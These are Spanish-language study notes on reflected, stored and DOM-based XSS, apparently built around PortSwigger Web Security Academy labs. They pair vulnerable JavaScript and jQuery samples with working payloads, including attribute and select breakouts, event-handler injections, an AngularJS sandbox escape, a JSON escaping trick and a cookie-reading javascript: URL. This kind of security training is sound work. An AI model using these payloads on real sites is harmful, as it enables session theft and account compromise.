
# XSS Reflejado, Almacenado y DOM

## 1. Reflected XSS (XSS Reflejado)

El tipo más común de XSS. Ocurre cuando una aplicación recibe datos en una petición HTTP y los incluye en la respuesta inmediata de forma insegura.

* **Flujo:** `Request (Payload) -> Server (Procesa) -> Response (Reflejo inmediato)`
* **Persistencia:** No. El ataque no se guarda en la aplicación.
* **Vector de Ataque:** Requiere un medio de entrega externo (Email, link en redes sociales, phishing) para engañar a la víctima y que haga clic en la URL maliciosa.

### Metodología de Testing (Manual)
1.  **Testear Entry Points:** Parámetros URL, Body de la petición, Path de la URL.
2.  **Técnica del Canario:** Envía un valor alfanumérico único (ej: `xss123`) en los inputs.
3.  **Detectar el Reflejo:** Usa el buscador (Ctrl+F) en la respuesta para ver dónde aparece tu canario.
4.  **Determinar Contexto:** Analiza el código alrededor de tu canario para saber qué caracteres necesitas para romper la sintaxis.

### Contextos y Payloads Comunes

| Contexto donde cae el Input | Ejemplo de Código | Payload Necesario |
| :--- | :--- | :--- |
| **HTML Body (Texto plano)** | `<div>Tu búsqueda: [INPUT]</div>` | `<script>alert(1)</script>` |
| **Atributo HTML** | `<input value="[INPUT]">` | `"><script>alert(1)</script>` |
| **String JavaScript** | `var search = '[INPUT]';` | `'-alert(1)-'` o `'; alert(1); //` |

---

## 2. Stored XSS (XSS Almacenado / Persistente)

Ocurre cuando la aplicación recibe datos de una fuente no confiable, los **guarda** (en base de datos, sistema de archivos, logs) y luego los muestra a los usuarios en una respuesta posterior.

* **Flujo:** `Attacker -> Server (Guarda en DB) -> Victim (Visita página) -> Server (Sirve payload) -> Browser (Ejecuta)`
* **Persistencia:** Sí.
* **Peligrosidad:** Crítica. Es un ataque autocontenido dentro de la aplicación. No necesitas enviar un enlace malicioso a la víctima; solo necesitas que naveguen por la página afectada (ej: leer un post de blog).

### Metodología de Testing
El desafío aquí es mapear dónde entran los datos y dónde salen.

1.  **Identificar Entry Points (Entradas):**
    * Comentarios en blogs/foros.
    * Campos de perfil de usuario (Nombre, Bio, Website).
    * Formularios de contacto.
    * Datos "Out-of-band": Logs de User-Agent visibles para admins, emails visualizados en webmail.
      
2.  **Identificar Exit Points (Salidas):**
    * Cualquier página donde se renderice contenido generado por usuarios.
3.  **Prueba:** Inyectar un identificador único, navegar por la aplicación y buscar dónde aparece.


### Caso Especial: Stored DOM XSS (Filtro Débil)
A veces el servidor guarda el dato, pero la vulnerabilidad explota en el cliente debido a un filtro JavaScript mal implementado.

**Escenario (Lab):**
El sitio permite comentarios. Un script intenta limpiar el HTML antes de mostrarlo, pero usa `replace` de forma incorrecta.

**Código Vulnerable:**
```javascript
// Solo reemplaza la PRIMERA ocurrencia de < y >
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```


## 3. DOM-Based XSS

### 1\. Sinks de HTML (Escritura directa)

#### Caso A: `document.write` básico

El sink más clásico. Escribe texto directamente en el documento mientras se carga.

**Código Vulnerable (Tus apuntes):**

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

  * **Análisis:** La función `trackSearch` toma tu `query` y la concatena dentro de un atributo `src` sin sanitizar.
  * **Ataque:** Necesitamos cerrar las comillas del atributo `src`, cerrar la etiqueta `img` e inyectar la nuestra.
  * **Payload:**
    ```html
    "><svg onload=alert(1)>
    ```

#### Caso B: `document.write` dentro de un elemento `select`

A veces tu input cae dentro de un control de formulario, como un menú desplegable. Aquí el contexto cambia.

**Escenario (Tus apuntes):**

  * URL: `.../product?productId=1&storeId=TU_INPUT`
  * El input `storeId` se escribe dentro de un `<select>`.

**Ataque:**
Si inyectas el script directamente, fallará porque los navegadores no ejecutan scripts dentro de un `<option>`. Primero debes romper el elemento `<select>`.

**Payload Completo:**

```text
&storeId="></select><img+src=1+onerror%3dalert(1)>
```

  * **Desglose:**
    1.  `">`: Cierra el atributo `value`.
    2.  `</select>`: **Crucial.** Cierra el menú desplegable forzosamente.
    3.  `<img...>`: Ahora que estamos fuera del select, inyectamos la imagen con el error.

-----

### 2\. Sink `innerHTML` (Ejecución de HTML)

Este sink reemplaza el contenido HTML de un elemento.

**Código Vulnerable (Tus apuntes):**

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

  * **Regla de Oro:** `innerHTML` interpreta el HTML, **PERO** por seguridad los navegadores modernos **bloquean las etiquetas `<script>`** insertadas por esta vía.
  * **Ataque:** Debes usar elementos que disparen eventos, como `svg` o `img`.
  * **Payload:**
    ```html
    <svg onload=alert(1)>
    <img src=1 onerror=alert(1)>
    ```

-----

### 3\. Sinks en Librerías: jQuery

#### Caso A: Sink `.attr()` (Manipulación de atributos)

jQuery facilita cambiar atributos como `href`.

**Código Vulnerable (Tus apuntes - Lab Feedback):**

```javascript
// Se carga jQuery
<script src="/resources/js/jquery_1-8-2.js"></script>

// HTML Estático
<div class="is-linkback">
    <a id="backLink" href="/aaa">Back</a>
</div>

// JS Vulnerable (Concepto)
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

  * **Vector:** Modificamos el parámetro `returnPath`.
  * **Análisis:** Al pulsar "Back", el navegador irá a donde diga el `href`.
  * **Ataque:** Usar el pseudo-protocolo `javascript:`.
  * **Payload (URL):**
    ```text
    ?returnPath=javascript:alert(document.cookie)
    ```

#### Caso B: Sink `$()` Selector (Hashchange Event)

Este es uno de los más complejos. Ocurre cuando la web usa el fragmento de la URL (`#`) para seleccionar elementos y hacer scroll o animaciones.

**Código Vulnerable (Tus apuntes):**

```javascript
$(window).on('hashchange', function(){
    // Coge lo que hay después del # en la URL
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

  * **Vulnerabilidad:** El selector `$()` de jQuery, si recibe código HTML en lugar de un selector CSS simple, **crea el elemento** y ejecuta sus scripts.
    
  * **Problema:** El código usa `hashchange`. Esto significa que el ataque solo funciona si el hash CAMBIA después de cargar la página.
    
  * **Solución (Exploit Server):** Usamos un `iframe` para automatizar el proceso:
    1.  Carga la página víctima limpia.
    2.  Cuando termina de cargar (`onload`), cambiamos el `src` añadiendo el payload malicioso al final.
    3.  Esto dispara el evento `hashchange` en la víctima.

**Payload Iframe (Tus apuntes):**

```html
<iframe src="https://ID-DEL-LAB.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

  * **Nota:** Fíjate que al final se añade `<img src=1 onerror=print()>`. Como `src=1` no existe, da error y ejecuta `print()`.

-----

### 4\. DOM XSS en Frameworks: AngularJS

AngularJS permite ejecutar código mediante **Template Injection** si logramos inyectar llaves `{{ }}` en un elemento con `ng-app`.

**Escenario:**

  * El sitio codifica `<` y `>` (HTML Encoding), por lo que `<script>` no funciona.
  * Sin embargo, AngularJS procesa el DOM *después* de cargar.

**Prueba de concepto:**
Si pones `{{ 1 + 1 }}` en el buscador y el sitio devuelve un `2`, es vulnerable.

**Payload (Bypass de Scope):**
AngularJS corre en un "sandbox" (`$scope`). Para ejecutar `alert()`, necesitamos salir al constructor global.

```javascript
{{$on.constructor('alert(1)')()}}
```

-----

### 5\. Reflected & Stored DOM XSS (Híbridos)

#### Caso A: Reflected DOM XSS (Contexto JSON)

El servidor refleja tu input dentro de una variable JSON o string de JS, pero escapa las comillas.

**Respuesta del servidor:**

```javascript
{"searchTerm":"TU_INPUT"}
```

Si pones `"`, el servidor lo cambia a `\"`.

**Payload:**

```text
\"-alert(1)}//
```

  * **Explicación:** La barra `\` escapa la barra del servidor (`\\`), liberando la comilla `"`. El `-` conecta la operación matemática para ejecutar `alert(1)`.

#### Caso B: Stored DOM XSS (Filtros débiles)

El servidor guarda un comentario pero usa un filtro JS mal hecho para mostrarlo.

**Código del filtro (Ejemplo):**

```javascript
html.replace('<', '&lt;').replace('>', '&gt;');
```

  * **Fallo:** Solo reemplaza la **primera** ocurrencia.
  * **Payload:**
    ```html
    <><img src=1 onerror=alert(1)>
    ```
  * **Resultado:** El filtro rompe el primer par `< >`, pero deja pasar intacta la etiqueta `<img...>` que viene después.
